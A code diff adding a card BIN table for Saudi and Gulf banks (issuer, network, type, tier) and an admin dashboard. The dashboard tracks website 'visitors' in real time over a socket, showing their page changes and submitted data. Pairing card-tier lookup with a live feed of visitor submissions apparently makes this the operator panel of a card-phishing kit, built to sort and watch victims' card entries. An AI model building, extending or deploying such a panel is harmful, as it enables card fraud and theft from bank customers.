+        '454683': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '454684': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '457927': { bank: 'الرياض', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '465961': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '477983': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '479090': { bank: 'الرياض', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '513213': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Prepaid' },
+        '513502': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Business' },
+        '514932': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '515750': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
+        '517531': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '520058': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Business' },
+        '520089': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+        '520090': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '524514': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '526084': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '527016': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Business' },
+        '527023': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '529271': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '529741': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Standard' },
+        '533940': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '535989': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'World' },
+        '536023': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'World' },
+        '537678': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Business' },
+        '537767': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Titanium' },
+        '539859': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '541679': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '541802': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '541988': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '545855': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '546319': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '547657': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '548322': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '548323': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '558563': { bank: 'الرياض', network: 'mada', type: 'Debit', tier: 'Prepaid' },
+        '558823': { bank: 'الرياض', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '559322': { bank: 'الرياض', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '588849': { bank: 'الرياض', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '968209': { bank: 'الرياض', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== بنك البلاد =====
+        '400795': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '401778': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '402667': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '403872': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '403991': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '403996': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '407989': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '417633': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Electron' },
+        '423254': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '424260': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '424261': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '424262': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '428334': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '428335': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '433072': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '433457': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '433952': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '443946': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '445687': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '446392': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '446393': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Signature' },
+        '446422': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '457795': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Corporate' },
+        '457796': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '468540': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '468541': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '468542': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '468543': { bank: 'البلاد', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '475078': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '475100': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '475109': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Purchasing' },
+        '475153': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '481206': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '481207': { bank: 'البلاد', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '490745': { bank: 'البلاد', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '636120': { bank: 'البلاد', network: 'Mada', type: 'Debit', tier: 'Standard' },
+        '968201': { bank: 'البلاد', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك السعودي الفرنسي =====
+        '401812': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '401883': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '401884': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '401978': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '404278': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '404861': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '405057': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '407392': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Business' },
+        '407415': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '421141': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '425871': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '428275': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '437974': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '437975': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '437976': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '437977': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '437978': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '437979': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '440647': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '440795': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Business' },
+        '444445': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '446404': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '454669': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '457865': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '457997': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '459583': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '459588': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '459800': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '463869': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Infinite' },
+        '473899': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '474491': { bank: 'الفرنسي', network: 'mada', type: 'Debit', tier: 'Prepaid Classic' },
+        '474827': { bank: 'الفرنسي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '475558': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '496655': { bank: 'الفرنسي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '512691': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+        '512727': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '517724': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '523615': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '523956': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '524148': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '538135': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '542747': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '547042': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '552012': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '552360': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '552444': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '555078': { bank: 'الفرنسي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '588845': { bank: 'الفرنسي', network: 'Mada', type: 'Debit', tier: 'Standard' },
+        '968208': { bank: 'الفرنسي', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك العربي الوطني =====
+        '404949': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '405145': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '406485': { bank: 'العربي', network: 'Visa', type: 'Debit', tier: 'Prepaid Select' },
+        '417346': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '417347': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '418764': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '420177': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '422862': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '435240': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '438772': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '439370': { bank: 'العربي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '455017': { bank: 'العربي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '455020': { bank: 'العربي', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '455035': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '455036': { bank: 'العربي', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '455037': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '455310': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '455422': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '455423': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '476328': { bank: 'العربي', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '524646': { bank: 'العربي', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '524940': { bank: 'العربي', network: 'mada', type: 'Debit', tier: 'Prepaid' },
+        '530792': { bank: 'العربي', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '534480': { bank: 'العربي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid World' },
+        '538776': { bank: 'العربي', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+        '549400': { bank: 'العربي', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+
+        // ===== بنك الجزيرة =====
+        '401758': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '402527': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '402804': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '406487': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '411092': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '414090': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '414841': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Ultra High Net Worth' },
+        '421051': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '428374': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '428375': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '440532': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '440533': { bank: 'الجزيرة', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '444495': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Platinum' },
+        '444496': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Platinum' },
+        '445564': { bank: 'الجزيرة', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '446914': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '454097': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Business' },
+        '473825': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '473826': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '473827': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '473828': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '489317': { bank: 'الجزيرة', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+        '489318': { bank: 'الجزيرة', network: 'mada', type: 'Debit', tier: 'Rewards' },
+        '489319': { bank: 'الجزيرة', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '489447': { bank: 'الجزيرة', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '504300': { bank: 'الجزيرة', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '511249': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '523041': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '524236': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '546924': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '550002': { bank: 'الجزيرة', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '968211': { bank: 'الجزيرة', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك السعودي للاستثمار =====
+        '415950': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '440629': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '440630': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Electron' },
+        '440631': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '457840': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '457841': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '469616': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '476815': { bank: 'الاستثمار', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '478295': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '478296': { bank: 'الاستثمار', network: 'Visa', type: 'Debit', tier: 'Prepaid Platinum' },
+        '483010': { bank: 'الاستثمار', network: 'mada', type: 'Debit', tier: 'Classic' },
+        '483011': { bank: 'الاستثمار', network: 'mada', type: 'Debit', tier: 'Platinum' },
+        '483012': { bank: 'الاستثمار', network: 'mada', type: 'Debit', tier: 'Infinite' },
+        '524205': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '529298': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '542373': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '552384': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '556579': { bank: 'الاستثمار', network: 'Mastercard', type: 'Credit', tier: 'Gold' },
+        '589206': { bank: 'الاستثمار', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+        '968207': { bank: 'الاستثمار', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك السعودي البريطاني (ساب) =====
+        '414478': { bank: 'ساب', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '455058': { bank: 'ساب', network: 'Visa', type: 'Credit', tier: 'Gold' },
+        '455340': { bank: 'ساب', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '455389': { bank: 'ساب', network: 'Visa', type: 'Credit', tier: 'Classic' },
+        '536581': { bank: 'ساب', network: 'Mastercard', type: 'Debit', tier: 'Prepaid Business' },
+        '541653': { bank: 'ساب', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '545297': { bank: 'ساب', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '548979': { bank: 'ساب', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '552953': { bank: 'ساب', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+        '605141': { bank: 'ساب', network: 'Mada', type: 'Debit', tier: 'Standard' },
+        '968204': { bank: 'ساب', network: 'Mada', type: 'Debit', tier: 'Mada' },
+
+        // ===== البنك الأول =====
+        '512060': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '522139': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '524165': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '530843': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '533172': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
+        '539931': { bank: 'الأول', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '540236': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '542008': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '543199': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '543408': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '546755': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '546756': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World Elite Flex' },
+        '546757': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '547645': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Executive Business' },
+        '548349': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Standard' },
+        '548350': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '549799': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+        '552375': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '552438': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'World' },
+        '557606': { bank: 'الأول', network: 'Mastercard', type: 'Debit', tier: 'Titanium' },
+        '558848': { bank: 'الأول', network: 'Mastercard', type: 'Debit', tier: 'Platinum' },
+        '558854': { bank: 'الأول', network: 'Mastercard', type: 'Credit', tier: 'Executive Business' },
+        '588846': { bank: 'الأول', network: 'Maestro', type: 'Debit', tier: 'Standard' },
+
+        // ===== STC Bank / STC Pay =====
+        '420132': { bank: 'STC Pay', network: 'mada', type: 'Debit', tier: 'Prepaid Classic' },
+        '441658': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '459047': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Business' },
+        '489022': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Rewards' },
+        '489671': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '489674': { bank: 'STC Pay', network: 'Visa', type: 'Credit', tier: 'Signature Business' },
+
+        // ===== D360 Bank =====
+        '428068': { bank: 'D360', network: 'Visa', type: 'Debit', tier: 'Classic' },
+        '431266': { bank: 'D360', network: 'Visa', type: 'Debit', tier: 'Signature' },
+        '435733': { bank: 'D360', network: 'Visa', type: 'Debit', tier: 'Infinite' },
+        '442463': { bank: 'D360', network: 'mada', type: 'Debit', tier: 'Classic' },
+
+        // ===== Tweeq =====
+        '223371': { bank: 'Tweeq', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '224020': { bank: 'Tweeq', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '242030': { bank: 'Tweeq', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '521661': { bank: 'Tweeq', network: 'Mastercard', type: 'Debit', tier: 'Standard' },
+        '532235': { bank: 'Tweeq', network: 'Mastercard', type: 'Credit', tier: 'Platinum' },
+        '541043': { bank: 'Tweeq', network: 'Mastercard', type: 'Credit', tier: 'Business' },
+
+        // ===== Urpay =====
+        '409735': { bank: 'Urpay', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '429004': { bank: 'Urpay', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+        '429018': { bank: 'Urpay', network: 'Visa', type: 'Credit', tier: 'Signature' },
+        '450657': { bank: 'Urpay', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '451111': { bank: 'Urpay', network: 'Visa', type: 'Debit', tier: 'Prepaid Classic' },
+        '487404': { bank: 'Urpay', network: 'Visa', type: 'Credit', tier: 'Business' },
+
+        // ===== محفظة برق (Barq) =====
+        '454887': { bank: 'برق', network: 'Visa', type: 'Credit', tier: 'Standard' },
+
+        // ===== نايفات للتمويل =====
+        '405913': { bank: 'نايفات', network: 'Visa', type: 'Credit', tier: 'Business Enhanced' },
+        '478774': { bank: 'نايفات', network: 'Visa', type: 'Credit', tier: 'Classic' },
+
+        // ===== بنك الخليج الدولي =====
+        '517597': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
+        '521657': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Credit', tier: 'Corporate World' },
+        '539737': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Credit', tier: 'Corporate' },
+        '541007': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Debit', tier: 'Prepaid World' },
+        '558705': { bank: 'الخليج الدولي', network: 'Mastercard', type: 'Credit', tier: 'World Elite' },
+
+        // ===== Vision Bank =====
+        '422222': { bank: 'Vision Bank', network: 'Visa', type: 'Debit', tier: 'Classic' },
+
+        // ===== تساهيل =====
+        '534524': { bank: 'تساهيل', network: 'Mastercard', type: 'Credit', tier: 'Titanium' },
+        '543884': { bank: 'تساهيل', network: 'Mastercard', type: 'Debit', tier: 'Prepaid' },
+        '555567': { bank: 'تساهيل', network: 'Mastercard', type: 'Credit', tier: 'World' },
+
+        // ===== Emirates NBD =====
+        '432629': { bank: 'Emirates NBD', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+
+        // ===== First Abu Dhabi Bank =====
+        '426220': { bank: 'FAB', network: 'Visa', type: 'Credit', tier: 'Platinum' },
+        '489458': { bank: 'FAB', network: 'Visa', type: 'Credit', tier: 'Infinite' },
+      };
+      
+      // البحث في قاعدة البيانات
+      let bankInfo = binDatabase[bin];
+      
+      // إذا لم يوجد، محاولة البحث بأول 4 أرقام
+      if (!bankInfo) {
+        const bin4 = bin.substring(0, 4);
+        for (const [key, value] of Object.entries(binDatabase)) {
+          if (key.startsWith(bin4)) {
+            bankInfo = value;
+            break;
+          }
+        }
+      }
+      
+      // تحديد النوع من أول رقم إذا لم يوجد في القاعدة
+      if (!bankInfo) {
+        let defaultType = 'Debit';
+        if (firstDigit === '4' || firstDigit === '5') {
+          // Visa/Mastercard - تخمين بناءً على BIN
+          const binNum = parseInt(bin);
+          if (binNum >= 400000 && binNum <= 499999) defaultType = 'Credit';
+        }
+        bankInfo = { bank: 'غير معروف', type: defaultType, tier: 'Standard' };
+      }
+      
+      return {
+        network: bankInfo.network || network,
+        bank: bankInfo.bank,
+        type: bankInfo.type,
+        tier: bankInfo.tier
+      };
+    }
+
+    // DOM Elements
+    const loginModal = document.getElementById('loginModal');
+    const loginForm = document.getElementById('loginForm');
+    const loginError = document.getElementById('loginError');
+    const dashboard = document.getElementById('dashboard');
+    const visitorsList = document.getElementById('visitorsList');
+    const visitorDetails = document.getElementById('visitorDetails');
+    const visitorCount = document.getElementById('visitorCount');
+
+    // Auto login if password saved
+    const savedPassword = localStorage.getItem('adminPassword');
+    if (savedPassword) {
+      // Show dashboard immediately, hide login
+      dashboard.classList.remove('hidden');
+      loginModal.style.display = 'none';
+      autoLogin(savedPassword);
+    } else {
+      // Show login modal
+      loginModal.style.display = 'flex';
+    }
+
+    function autoLogin(password) {
+      socket = io(SOCKET_URL, {
+        transports: ['websocket', 'polling'],
+      });
+
+      socket.on('connect', () => {
+        socket.emit('admin:register', { password });
+      });
+
+      socket.on('admin:authenticated', (success) => {
+        if (success) {
+          localStorage.setItem('adminPassword', password);
+          loginModal.style.display = 'none';
+          dashboard.classList.remove('hidden');
+          setupSocketListeners();
+        } else {
+          localStorage.removeItem('adminPassword');
+          loginModal.style.display = 'flex';
+          dashboard.classList.add('hidden');
+          loginError.classList.remove('hidden');
+        }
+      });
+    }
+
+    // Login handler
+    loginForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const password = document.getElementById('password').value;
+      autoLogin(password);
+    });
+
+    // Setup socket listeners
+    function setupSocketListeners() {
+      // Setup password change listener
+      socket.on('admin:passwordChanged', (success) => {
+        const errorEl = document.getElementById('passwordError');
+        const successEl = document.getElementById('passwordSuccess');
+        if (success) {
+          successEl.classList.remove('hidden');
+          localStorage.setItem('adminPassword', document.getElementById('newPassword').value);
+          setTimeout(() => {
+            hideChangePasswordModal();
+          }, 1500);
+        } else {
+          errorEl.textContent = 'كلمة المرور الحالية غير صحيحة';
+          errorEl.classList.remove('hidden');
+        }
+      });
+
+      socket.on('visitors:list', (list) => {
+        list.forEach(v => visitors.set(v._id, v));
+        renderVisitorsList();
+      });
+
+      socket.on('visitor:new', (visitor) => {
+        // Ensure new visitor is marked as connected
+        visitor.isConnected = true;
+        visitors.set(visitor._id, visitor);
+        renderVisitorsList();
+        showNotification('زائر جديد: ' + visitor.visitorNumber);
+      });
+
+      socket.on('visitor:pageChanged', ({ visitorId, page }) => {
+        const visitor = visitors.get(visitorId);
+        if (visitor) {
+          visitor.page = page;
+          visitors.set(visitorId, visitor);
+          renderVisitorsList();
+          if (selectedVisitorId === visitorId) {
+            renderVisitorDetails(visitor);
+          }
+        }
+      });
+
+      socket.on('visitor:dataSubmitted', ({ visitorId, data, visitor }) => {
+        // Ensure visitor is marked as connected and update data
+        visitor.isConnected = true;
+        visitor.hasNewData = true;
+        visitors.set(visitorId, visitor);
+        renderVisitorsList();
+        // Always update details if this visitor is selected
+        if (selectedVisitorId === visitorId) {
+          // Mark as read immediately since admin is viewing this visitor
+          socket.emit('admin:markAsRead', visitorId);
